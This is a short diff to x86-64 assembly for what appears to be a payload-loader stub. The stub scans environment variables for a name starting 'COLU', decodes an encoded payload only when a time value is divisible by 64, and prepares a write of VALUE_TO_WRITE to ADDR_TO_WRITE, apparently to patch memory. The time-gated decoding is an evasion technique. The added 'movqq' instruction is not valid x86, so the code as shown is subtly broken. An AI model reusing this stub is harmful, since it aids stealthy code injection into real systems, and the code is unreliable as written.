@@ -29,7 +29,6 @@ env_check_loop:
     mov rcx, [rdi]
     scasq
     jrcxz env_check_okay
-    nop
     mov eax, dword ptr [rcx]
     ror eax, 1
     cmp eax, 0xaaa627a1 /* "COLU" */
@@ -43,17 +42,18 @@ env_check_loop:
 env_check_okay:
     // lea rdi, [rbx+(_end-_begin)+8]
     .byte 0x48, 0x8d, 0x7b, (_end-_begin)+8
+    push rdi
     /* Patch payload to only run at correct time. */
     call [rbx-8]
     /* Decode payload only when time() % 64 == 0 */
     test al, 63
     movabs r11, VALUE_TO_WRITE
+    pop rdi
     jnz bye
     // Decode payload
-    push (PAYLOAD_SIZE_IN_WORDS+1)
-    xor eax, eax
+    movqq rcx, (PAYLOAD_SIZE_IN_WORDS+1)
     movabs r10, ADDR_TO_WRITE
-    pop rcx
+    xor eax, eax
 decode_loop:
     xor [rdi+rcx*4], eax
     add eax, [rdi+rcx*4]
